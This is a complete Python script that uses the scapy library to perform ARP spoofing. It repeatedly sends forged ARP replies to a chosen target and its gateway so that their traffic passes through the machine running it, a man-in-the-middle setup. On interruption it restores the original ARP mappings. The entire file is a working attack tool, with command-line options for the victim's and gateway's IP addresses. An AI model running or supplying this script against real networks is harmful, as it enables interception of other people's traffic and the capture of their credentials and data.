#!/usr/bin/env python
"""
Program to send out two packets intended for a target and a gateway.
This is intended to change the mac addresses in the ARP tables to route traffic through the machine running the script
IP forwarding must be enabled
"""

import scapy.all as scapy
import optparse
import time


sent_packets = 0


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Enter the IP address of the target pc")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Enter the gateway IP")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please enter a target IP address, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please enter a gateway IP address, use --help for more info")
    return options


def get_mac_add(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    mac_add = answered[0][1].hwsrc
    return mac_add


def spoof(target_ip, gateway_ip):
    mac_add = get_mac_add(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_add, psrc=gateway_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(target_ip, gateway_ip):
    gateway_mac = get_mac_add(gateway_ip)
    mac_add = get_mac_add(target_ip)
    res_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_add, psrc=gateway_ip, hwsrc=gateway_mac)
    #print(res_packet.show())
    #print(res_packet.summary())
    scapy.send(res_packet, verbose=False)


try:
    options = get_arguments()
    target = options.target_ip
    gateway = options.gateway_ip
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        sent_packets += 2
        print("\r[+] Total packets sent: " + str(sent_packets) + "\tTarget: " + options.target_ip + "\t\tGateway: " + options.gateway_ip, end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target, gateway)
    restore(gateway, target)
    print("\n[-] Ctrl + C detected. Original MAC addresses restored. Arpspoof completed.\n")
except IndexError:
    print("\n[-] The IP addresses may be incorrect or a host is offline")
